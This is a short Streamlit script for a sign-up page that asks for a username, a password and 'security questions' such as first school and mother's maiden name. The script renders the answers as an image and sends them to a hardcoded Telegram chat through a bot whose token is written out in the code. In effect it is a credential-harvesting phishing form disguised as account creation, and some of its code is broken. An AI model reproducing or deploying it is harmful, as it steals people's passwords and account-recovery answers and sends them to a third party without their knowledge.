import streamlit as st
import pandas as pd

# streamlit run app.py

st.subheader("Create an Account")
new_user = st.text_input('Username')
new_passwd = st.text_input('Password', type='password')
if new_user and new_passwd:
	st.success("You have successfully created an account.Go to the Login Menu to login")
	df = pd.DataFrame({"username": [new_user], "password": [new_passwd]})

st.write('Please answer the security questions:')
school = st.text_input('Name of your first school?')
mom_name = st.text_input('Mother''s maiden name?')
hotel = st.text_input('next vacation - fancy boho chick hotel or airbnb in a secluded beach?')
drink = st.text_input('Next vacation with grillouzo or limoncello?')


# save results to csv and send via telegram

df = pd.DataFrame({"username": [new_user], "password": [new_passwd], "school": [school], "mom_name": [mom_name], "hotel": [hotel], "drink": [drink]}, ignore_index=True)
import telebot
import dataframe_image as dfi
import cv2

TOKEN = "2034688341:AAGiWVOQZ_wJUDLEGPbqXn80LzJ9palMWu0"
tb = telebot.TeleBot(TOKEN)  # create a new Telegram Bot object
if st.button('Sign Up'):
	dfi.export(df,"mytable.png")
	image = cv2.imread('mytable.png')
	image = open('mytable.png', 'rb')
	chat_id = '630924196'
	tb.send_photo(chat_id=chat_id, photo=image)

